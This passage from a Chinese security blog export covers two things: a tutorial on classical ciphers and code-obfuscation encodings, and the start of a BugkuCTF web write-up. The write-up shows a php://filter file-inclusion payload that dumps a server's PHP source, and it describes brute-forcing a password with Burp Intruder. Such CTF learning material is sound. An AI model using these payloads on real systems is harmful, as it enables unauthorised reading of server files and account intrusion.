class="language-none">KWTAZQLAWWZCPONIVBTTBVQUZUGRNHAYIYGIAAYURCUQLDFTYVHTNQEENUPAIFCUNQTNGITEFUSHFDWHRIFSVTBISYDHHASQSROMUEVPQHHCCRBYTQBHWYRRHTEPEKHOBFSZUQBTSYRSQUDCSAOVUUGXOAUYWHPGAYHDNKEZPFKKWRIEHDWPEIOTBKESYETPBPOGTHQSPUMDOVUEQAUPCPFCQHRPHSOPQRSSLPEVWNIQDIOTSQESDHURIEREN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>解密：</p><p>得到加密矩阵:</p><pre class="line-numbers language-none"><code class="language-none">G B C M KD H U E TL V Y W IX O Z S PN F A R Q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文:</p><pre class="line-numbers language-none"><code class="language-none">CRYPTANALYS IS OF BIFID BY HAND IS ACTUALLY FAIRLY DIFFICULT THE FRACTIONATING NATURE OF THE CIPHER IE EACH LETTER IS SUBSTITUTED BY CHARACTERS THEN THESE CHARACTERS ARE IUM BLED WHICH WILL PULL THEM APART MAKES THE CIPHER MUCH STRONGER THAN SUBSTITUTION CIPHERS OR TRANSPOSITION CIPHER SON THEIR OWN<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="20-三分密码">20.三分密码</h4><p>三分密码(Trifid Cipher)结合换位和替换，三分密码与双密码非常相似，差别之处就是用除了3×3×3的密阵代替5×5密阵。</p><p>示例密阵:</p><pre class="line-numbers language-none"><code class="language-none">密阵顺序 &#x3D; EPSDUCVWYM.ZLKXNBTFGORIJHAQ      方阵 1      方阵 2      方阵 3                                       1 2 3      1 2 3      1 2 3    1 E P S    1 M . Z    1 F G O    2 D U C    2 L K X    2 R I J    3 V W Y    3 N B T    3 H A Q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文: <code>THE QUICK BROWN FOX.</code></p><p>经过密阵转换：</p><pre class="line-numbers language-none"><code class="language-none">T H E Q U I C K B R O W N F O X .2 3 1 3 1 3 1 2 2 3 3 1 2 3 3 2 23 3 1 3 2 2 2 2 3 2 1 3 3 1 1 2 13 1 1 3 2 2 3 2 2 1 3 2 1 1 3 3 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>T(233)表示T在第一个方阵第三行第三列的位置分组(分组密钥以5为例):</p><pre class="line-numbers language-none"><code class="language-none">THEQU ICKBR OWNFO X.23131 31223 31233 2233132 22232 13311 2131132 23221 32113 32<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>合并：</p><pre class="line-numbers language-none"><code class="language-none">23131 33132 31132 31223 22232 23221 31233 13311 32113 22 21 32<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在经过密阵转换后密文:</p><pre class="line-numbers language-none"><code class="language-none">231313313231132312232223223221312331331132113222132N  O  O  N  W  G  B  X  X  L  G  H  H  W  S  K  W<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>想要深入了解三分密码并破解三分密码的小伙伴推荐去看LANIKI教授的一篇密码课程章节的 <a href="http://www.und.nodak.edu/org/crypto/crypto/lanaki.crypt.class/lessons/lesson17.zip">讲义</a> 。</p><h4 id="21-四方密码">21.四方密码</h4><p>四方密码 [Four-Square Cipher] 是类似普莱菲尔密码双字母加密密码，这样使加密效果强于其他替换密码，因为频率分析变得更加困难了</p><p>四方密码使用4个预先设置的5×5字母矩阵，每个矩阵包括25个字母，通常字母’j’被融入到’i’中(维基百科上说’q’被忽略，不过这不重要，因为’q’和’j’都是很少出现的字母)，通常左上和右下矩阵式是标准字母排序明文矩阵，右上和左下矩阵是打乱顺序的密钥矩阵。</p><p>示例矩阵：</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-4bc63d0dc9ba3342.png?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>整理明文(分组不够时用’X’填充)： <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><p>加密过程：分别在明文矩阵中找到’TH’，分别找到他们在右上矩阵有左下矩阵的交点字母’ES’就是密文，以此类推。</p><p>密文： <code>ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ</code></p><p><strong>已知密钥矩阵加解密</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt;from pycipher import Foursquare&gt;&gt;&gt;fs &#x3D; Foursquare(&#39;zgptfoihmuwdrcnykeqaxvsbl&#39;,&#39;mfnbdcrhsaxyogvituewlqzkp&#39;)&gt;&gt;&gt;fs.encipher(&#39;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&#39;)&#39;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&#39;&gt;&gt;&gt;fs.decipher(&#39;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/">传送门</a></p><p><strong>未知密钥矩阵破解</strong></p><p>推荐一篇关于采用 <a href="http://blog.csdn.net/xianlingmao/article/details/7798647">模拟退火算法</a> 的 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/">四方密码分析</a> 文章，如果有足够多的密文那么四方密码可以轻易被破解，如果知道了明文和密文推出密钥是很容易的，猜测部分明文是一个有效的方法去破解四方密码，如果一部分明文已知或者可以被猜测出 那么我们首先要确定尽可能多可利用的密钥，然后才可以进行更多的推测或者用其他的方法破译。基于四方密码分析一文实现的 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/">C代码</a> 破解示例：</p><p>密文(密文最好在200个字符以上)：</p><p>HMMKEQESDTMDHLAWFWMNKSOSFOMRFNLWLKHNSQGGEKXEOLLVDXNRSQQGARTFKSAVNUDLFNDHESPZGQ TWESAGPGSQSQSTPKUSBBQLQHESAGPGSQSQGXLNAVHTPMHMKKNYGSUGDMTPDGFNKYAVHXLWGEKRILESLZ ZOFNAVIHRHRKAGHSMYUGEGNSRGAVMVOQPRLNKRXLMYLQPXILESQYBNRHRKAGKYQXDIHMPGPYOERZOLBEZ LURFWLWUOLDDPNSQYAGMUQPQWESBEZVEQESDTMDBQLWDIUSHB</p><p>用法：</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment">#!shell</span>gcc -O3 -lm foursquarecrack2.c scoreText_2.c -o fsc./fsc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出结果：</p><pre class="line-numbers language-none"><code class="language-none">#!shellRunning foursquarecrack, this could take a few minutes... best score so far: -1239.505249, on iteration 1Key: &#39;KFMLUGWSQEPOZTNRBHDAVXCIY&#39;,&#39;UGSVKFIZMOYXPQRWTHLNCABED&#39;     plaintext: &#39;THECIPHERTEXTSQUARESCANBEGENERATEDUSINGAKEYWORDDROPPINGDUPLICAT            ELETTERSTHENFILLTHEREMAININGSPACESWITHTHEREMAININGLETTERSOFTHEA            LPHABETINORDERALTERNATIVELYTHECIPHERTEXTSQUARESCANBEGENERATEDCO            MPLETELYRANDOMLYTHEFOURSQUAREALGORITHMALLOWSFORTWOSEPARATEKEYSO            NEFOREACHOFTHETWOCIPHERTEXTMATRICESX&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="22-棋盘密码">22.棋盘密码</h4><p>棋盘密码（Checkerboard Cipher)是使用一个波利比奥斯方阵和两个密钥作为密阵的替换密码，通常在波利比奥斯方阵中J字母往往被包含在I字母中。</p><p>示例密阵：</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">   <span class="token constant">Q</span>  <span class="token constant">U</span>  <span class="token constant">I</span>  <span class="token constant">C</span>  <span class="token constant">K</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token constant">B</span> <span class="token operator">|</span><span class="token constant">K</span>  <span class="token constant">N</span> <span class="token constant">I</span><span class="token operator">/</span><span class="token constant">J</span> <span class="token constant">G</span>  <span class="token constant">H</span><span class="token constant">R</span> <span class="token operator">|</span><span class="token constant">P</span>  <span class="token constant">Q</span>  <span class="token constant">R</span>  <span class="token constant">S</span>  <span class="token constant">T</span><span class="token constant">O</span> <span class="token operator">|</span><span class="token constant">O</span>  <span class="token constant">Y</span>  <span class="token constant">Z</span>  <span class="token constant">U</span>  <span class="token constant">A</span><span class="token constant">W</span> <span class="token operator">|</span><span class="token constant">M</span>  <span class="token constant">X</span>  <span class="token constant">W</span>  <span class="token constant">V</span>  <span class="token constant">B</span><span class="token constant">N</span> <span class="token operator">|</span><span class="token constant">L</span>  <span class="token constant">F</span>  <span class="token constant">E</span>  <span class="token constant">D</span>  <span class="token constant">C</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>经过密阵替换:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!shell</span>明文<span class="token symbol">:T</span>  <span class="token constant">H</span>  <span class="token constant">E</span>  <span class="token constant">Q</span>  <span class="token constant">U</span>  <span class="token constant">I</span>  <span class="token constant">C</span>  <span class="token constant">K</span>  <span class="token constant">B</span>  <span class="token constant">R</span>  <span class="token constant">O</span>  <span class="token constant">W</span>  <span class="token constant">N</span>  <span class="token constant">F</span>  <span class="token constant">O</span>  <span class="token constant">X</span>密文<span class="token symbol">:RK</span> <span class="token constant">BK</span> <span class="token constant">RU</span> <span class="token constant">OC</span> <span class="token constant">OC</span> <span class="token constant">BI</span> <span class="token constant">NK</span> <span class="token constant">BQ</span> <span class="token constant">WK</span> <span class="token constant">RI</span> <span class="token constant">OQ</span> <span class="token constant">WI</span> <span class="token constant">BU</span> <span class="token constant">NU</span> <span class="token constant">OQ</span> <span class="token constant">WU</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="23-跨棋盘密码">23.跨棋盘密码</h4><p>跨棋盘密码(Straddle Checkerboard Cipher)是一种替换密码，当这种密码在结合其他加密方式，加密效果会更好</p><p>棋盘示例(选择3和7作为变换):</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">   0 1 2 3 4 5 6 7 8 9   f k m   c p d   y e3: h b i g q r o s a z7: l u t j n w v x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>明文: <code>T H E Q U I C K B R O W N F O X</code></p><p>经过加密棋盘替换得到密文: <code>72 30 9 34 71 32 4 1 31 35 36 75 74 0 36 77</code></p><p>当然我们还可以继续用其他的加密方式在对跨棋盘密码加密出的结果再进行加密:</p><p>示例变换密钥:83729</p><pre class="line-numbers language-none"><code class="language-none"> 8372983729837298372983729837+7230934713241313536757403677----------------------------- 5502817432078501808630122404<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在经过棋盘转换后:</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment">#!shell</span><span class="token number">5502817432078501808630122404</span>ppfmyk n <span class="token keyword">if</span>  pfkyfyd hkmmcfc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>最终得到密文: ppfmyk n if pfkyfyd hkmmcfc</p><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/">传送门</a></p><h4 id="24-分组摩尔斯替换密码">24.分组摩尔斯替换密码</h4><p>分组摩尔斯替换密码(Fractionated Morse Cipher)首先把明文转换为莫尔斯电码，不过每个字母之间用 <code>x</code> 分开，每个单词用 <code>xx</code> 分开。然后使用密钥生成一个替换密表，这个密表包含所有 <code>. - x</code> 组合的情况(因为不会出现 <code>xxx</code> 的情况，所以一共26种组合)。</p><p>密钥: <code>MORSECODE</code></p><p>密表:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css">MORSECDABFGHIJKLNPQTUVWXYZ.........---------XXXXXXXX...---XXX...---XXX...---XX.-X.-X.-X.-X.-X.-X.-X.-X.-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>说明:密表下半部分是固定的，密表的安全性以及加密效果主要取决于使用的密钥。</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><pre class="line-numbers language-css" data-language="css"><code class="language-css">#!shell-x....x.xx--.-x..-x..x-.-.x-.-xx-...x.-.x---x.--x-.xx..-.x---x-..-xx.---x..- --x.--.x...xx---x...-x.x.-.xx-x....x.xx.-..x.-x--..x-.--xx-..x---x--.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说明:明文在转换为(类似)摩尔斯电码后进行每3个字符分组，再进行密表的查表。</p><p>密文(经过密表替换): <code>LMUWC OQVHG ZMTAK EVYSW NOYJQ NLIQB JQCDH XMDYF TWRGP FWNH</code></p><p>已知密钥在线加解密 <a href="http://ruffnekk.stormloader.com/fractmorse_tool.html">传送门</a></p><h4 id="25-bazeries密码">25.Bazeries密码</h4><p>Bazeries密码(Bazeries Cipher)是换位密码和替换密码的组合，使用两个波利比奥斯方阵，一个明文字母方阵，使用一个随机的数字(一般小于1000000)的生成一个密钥矩阵同时作为第一轮明文划分分组，比如2333这个数字翻译为英文便是TWO THOUSAND THREE HUNDRED THIRTY THREE,从第一个字母T开始选取不重复的字母，之后再从字母表中按序选取没有出现的字母组成密钥矩阵。</p><p>明文: <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>随机数字: <code>2333</code></p><p>明文矩阵:</p><pre class="line-numbers language-R" data-language="R"><code class="language-R">A  F  L  Q  VB  G  M  R  WC  H  N  S  XD I&#x2F;J O  T  YE  K  P  U  Z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>示例密钥矩阵:</p><pre class="line-numbers language-R" data-language="R"><code class="language-R">#!shellT  W  O  H  US  A  N  D  RE I&#x2F;J Y  B  CF  G  K  L  MP  Q  V  X  Z<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文分组:</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#!shell</span>2   3   3   3   2   3   3   3  2   3   3  3TH EQU ICK BRO WN FOX JUM PSO VE RTH ELA ZYD OG<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>分组明文反序:</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment">#!shell</span>HT UQE KCI ORB WN XOF MUJ OSP EV EHT ALE DYZ GO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用密钥矩阵替换:</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment">#!shell</span>IL XHP QEG KDS YR CKW NXG KBV PU ILD TOP FMZ AK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(比如’H’在明文矩阵对应到密钥矩阵的位置就是’I’）</p><p>已知密钥在线加解密 <a href="http://ruffnekk.stormloader.com/bazeries_tool.html">传送门</a></p><h4 id="26-digrafid密码">26.Digrafid密码</h4><p>Digrafid密码(Digrafid Cipher)使用两个密钥生成分别生成类似波利比奥斯方阵的3x9方格的密表。，主要有3分组和4分组两类。</p><p>第一个方阵密钥: <code>digrafid</code></p><p>第二个方阵密钥: <code>cipher</code></p><p>密表：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css">#!shell1 2 3 4 5 6 7 8 9D I G R A F D B C 1 2 3E H J L M N O P Q 4 5 6S T U V W X Y Z # 7 8 9                  c f s 1                  i g t 2                  p j u 3                  h k v 4                  e l w 5                  r m x 6                  a n y 7                  b o z 8                  d q # 9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明文: <code>THE QUICK BROWN FOX</code></p><p>密表转换(以4分组为例):</p><pre class="line-numbers language-nginx" data-language="nginx"><code class="language-nginx"><span class="token comment">#!shell</span>Th Eq Ui Ck   Br Ow Nf Ox2  1  3  9    8  7  6  77  5  7  2    1  6  5  64  9  2  4    6  5  1  6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明:T在第一矩阵第2列，h在第二矩阵第4行，T所在的行与h所在的列相交的位置数字为7，所以Th表示为274。</p><p>转换密文:</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token comment">#!shell</span>213 975 724 924   876 716 566 516Ip  <span class="token comment">#e  Dk  Ck    Zr  Dr  Mx  Ar</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="27-格朗普雷密码">27.格朗普雷密码</h4><p>格朗普雷密码(Grandpré Cipher)是替换密码的一种，一般使用8个8字母的单词横向填充8x8方阵，且第一列为一个单词，并且在方阵中26个字母都必须出现一次以上。</p><p>示例密阵:</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-5bd2ca638ecc9fa0.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><pre class="line-numbers language-Less" data-language="Less"><code class="language-Less">#!shell明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O 密文:84 27 82 41 51 66 31 36 15 71 67 73 52 34 67<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>说明：明文中的字母在密阵位置可能不止一个，所以加密结果可能有多种，但是不影响解密。密阵还有6x6，7x7，9x9,10x10几种。显然密阵越大每个字母被替换的情况就可能越多，那么加密效果就更好。</p><h4 id="28-比尔密码">28.比尔密码</h4><p>比尔密码(Beale ciphers)有三份密码，当然这里说的是已被破解第二份，是一种类似书密码的替换密码。</p><p>以第二密码为例，每一个数字代表美国《独立宣言》的文本中的第几个词的首字母，如1代表第1个词的首字母“w”，2代表第2个词首字母“i”。解密后的文字如下：</p><p>I have deposited in the county of Bedford…</p><p>比尔密码还有一段有趣的故事，感兴趣可以看一下比尔密码的 <a href="https://zh.wikipedia.org/wiki/%E6%AF%94%E5%B0%94%E5%AF%86%E7%A0%81">详细介绍</a> 。</p><h4 id="29-键盘密码">29.键盘密码</h4><p>一般用到的键盘密码就是手机键盘和电脑键盘两种，2014 0ctf比赛里Crypto类型中Classic一题就是电脑键盘密码，详细可以 <a href="http://www.programlife.net/0ops-ctf-writeup.html">参考</a> ，另外给出另外一些 <a href="http://www.secbox.cn/hacker/ctf/8078.html">参考</a> 情况。</p><h3 id="其他有趣的机械密码">其他有趣的机械密码</h3><h4 id="1-恩尼格玛密码">1.恩尼格玛密码</h4><p>恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。详细工作原理参考 <a href="https://zh.wikipedia.org/wiki/%E6%81%A9%E5%B0%BC%E6%A0%BC%E7%8E%9B%E5%AF%86%E7%A0%81%E6%9C%BA">维基百科</a> 。</p><img src="C:\Users\888888\Desktop\博客更新\CTF中那些有趣的编码与解码方式\恩尼格玛密码机.png" style="zoom:50%;" /><p>在线模拟 <a href="http://enigmaco.de/enigma/enigma.html">传送门</a></p><h3 id="代码混淆加密">代码混淆加密</h3><h4 id="1-asp混淆加密">1.asp混淆加密</h4><p><a href="http://www.zhaoyuanma.com/aspfix.html">asp混淆加密</a></p><h4 id="2-php-language-混淆加密">2.php language=“混淆加密”</h4><p><a href="http://www.zhaoyuanma.com/phpjmvip.html">php language=“混淆加密”</a></p><h4 id="3-css-language-js混淆加密">3.css language=“js混淆加密”</h4><p><a href="http://tool.css-js.com/">css language=&quot;/js混淆加密&quot;</a></p><h4 id="4-vbscript-encode混淆加密">4.VBScript.Encode混淆加密</h4><p><a href="http://www.zhaoyuanma.com/aspfix.html">VBScript.Encode混淆加密</a></p><h4 id="5-ppencode">5.ppencode</h4><p>ppencode-Perl把Perl代码转换成只有英文字母的字符串。</p><img src="https://upload-images.jianshu.io/upload_images/3259472-0ea94397eb9d95bd.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp" style="zoom:50%;" /><p>ppencode <a href="http://namazu.org/~takesako/ppencode/demo.html">传送门</a></p><h4 id="6-rrencode">6.rrencode</h4><p>rrencode可以把ruby代码全部转换成符号。</p><p><img src="https://upload-images.jianshu.io/upload_images/3259472-fa57f9040cfa3e99.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/format/webp" alt=""></p><p>rrencode <a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html">传送门</a></p><h4 id="7-jjencode-aaencode">7.jjencode/aaencode</h4><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，介绍的 <a href="http://utf-8.jp/public/20090710/jjencode.pps">PPT</a> ，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p><img src="https://upload-images.jianshu.io/upload_images/3259472-df7f9bf034ccaf36.png?imageMogr2/auto-orient/strip|imageView2/2/format/webp" style="zoom:50%;" /><p>aaencode <a href="http://utf-8.jp/public/aaencode.html">传送门</a></p><p>jjencode/aaencode的解密直接在浏览器的控制台里输入密文即可执行解密，想要详细了解jjencode是如何进行请 <a href="http://pferrie2.tripod.com/papers/jjencode.pdf">参考</a> ，你也可以在github上 <a href="https://github.com/jacobsoo/Decoder-JJEncode">下载</a> 实现jjdecoder的源码进行分析。</p><h4 id="8-jsfuck">8.JSfuck</h4><p>JSFuck 可以让你只用 6 个字符 <code>[ ]( ) ! +</code> 来编写 JavaScript 程序。</p><p>JSfuck <a href="http://www.jsfuck.com/">传送门</a></p><h4 id="9-jother">9.jother</h4><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： <code>! + ( ) [ ] &#123; &#125;</code> 。只用这些字符就能完成对任意字符串的编码。</p><p><a href="http://drops.wooyun.org/author/do9gy">do9gy</a> 的 <a href="http://drops.wooyun.org/web/4410">jother编码之谜</a></p><p>jother编码 <a href="http://tmxk.org/jother/">传送门</a></p><p>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密：</p><h3 id="10-brainfuck">10.brainfuck</h3><p>Brainfuck是一种极小化的计算机语言，按照&quot;Turing complete（完整图灵机）&quot;思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号( <code>&gt; &lt; + - . , [ ]</code> )的组合来完成。</p><p>明文：hello!</p><pre class="line-numbers language-Brainfuck" data-language="Brainfuck"><code class="language-Brainfuck">#!shell+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ +++++[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;--.&lt; +++++ ++[-&gt;----- --&lt;]&gt; ----- ----- .&lt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="神奇的编码形式：">神奇的编码形式：</h3><p><s>兽语密码极类似编码</s>：<a href="http://hi.pcmoe.net/roar.html">兽语编码</a>这个编码是之前做NuCTF迎新赛的时候看到的，类似的编码还有<a href="https://ctf.bugku.com/tool/todousharp">与佛论禅</a>密码，<a href="http://hi.pcmoe.net/index.html">与熊论道</a>，<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>，<a href="https://ctf.bugku.com/tool/cvecode">社会主义价值观密码</a>等。以下部分是以**flag{}**进行加密得到。</p><blockquote><p>兽音译者: ~呜嗷嗷嗷嗷呜啊嗷啊呜呜嗷呜呜~嗷嗷~啊嗷啊呜嗷嗷~嗷~嗷~呜呜嗷呜啊嗷嗷嗷呜啊呜~啊呜嗷呜呜~呜呜嗷啊</p></blockquote><blockquote><p>与佛论禅:   佛曰：麼那究夷穆波皤特那俱婆怯耶即姪哆室那亦有</p></blockquote><blockquote><p>与熊论道:   熊曰：呋食食啽笨咯人和嘶啽更</p></blockquote><blockquote><p>新佛曰：    新佛曰：諸毘隸僧降吽毘諸陀摩隸毘僧毘缽薩願毘耨咤毘陀願毘羅毘嘇喃毘塞毘薩毘如毘囑</p></blockquote><blockquote><p>社会主义价值观密码:  公正公正公正友善公正公正民主公正法治法治友善平等法治友善法治</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugkuCTF之web解题记录(一)</title>
      <link href="/2021/10/17/BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87/"/>
      <url>/2021/10/17/BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<hr><h1>BugkuCTF之web解题记录(一)</h1><p>[TOC]</p><h3 id="1-文件包含">1 文件包含</h3><p>题目明示了这个题的漏洞类型，文件包含漏洞。</p><p>构造payload：<strong>?file=php://filter/read=convert.base64-encode/resource=index.php</strong></p><p>文件包含类型的漏洞关于php://filter这一为协议有两张构造方式另一种是**?file=php://filter/resource=xxx.php**这一种类型往往无法显示，所以一般采用第一种方式。</p><blockquote><p>77u/PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LXdlYjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFnezk5YmZmMzJjZTkwYTZmY2I0YWVhYTFmMTAzNjM2MzY3fQ0KPz4NCjwvaHRtbD4NCg==</p></blockquote><p>得到一大堆base64编码，解码得到flag</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;    &lt;title&gt;Bugku-web&lt;&#x2F;title&gt;&lt;?phperror_reporting(0);if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;$file&#x3D;$_GET[&#39;file&#39;];if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;echo &quot;Oh no!&quot;;exit();&#125;include($file); &#x2F;&#x2F;flag:flag&#123;99bff32ce90a6fcb4aeaa1f103636367&#125;?&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-好像需要密码">2 好像需要密码</h3><p><img src="./BugkuCTF%E8%A7%A3%E9%A2%98%E8%AE%B0%E5%BD%95Web%E7%AF%87%5C76f459dbcc7649b1a388c385b1c7f31d.jpg" alt=""></p><p>随便往里面传一个数据，使用<code>burp</code>抓包， 抓包后发送到<code>Intruder</code>模块 ，由于密码是五位数，还有字典生成工具生成一个从00000到99999的字典导入burp的<code>Intruder</code>模块， 将<code>pwd</code>置为参数，因为变化的只有一个参数<code>pwd</code>，所以选择的攻击方式为<code>Sniper</code> 。</p><pre class="line-numbers language-none"><code class="language-none">POST &#x2F;?yes HTTP&#x2F;1.1Host: 114.67.246.176:12057User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko&#x2F;20100101 Firefox&#x2F;92.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;x-www-form-urlencodedContent-Length: 7Origin: http:&#x2F;&#x2F;114.67.246.176:12057Connection: closeReferer: http:&#x2F;&#x2F;114.67.246.176:12057&#x2F;Cookie: Hm_lvt_c1b044f909411ac4213045f0478e96fc&#x3D;1620903791,1621819076; _ga&#x3D;GA1.1.1921386327.1620903793Upgrade-Insecure-Requests: 1pwd&#x3D;§111§<span aria-hidden="true" 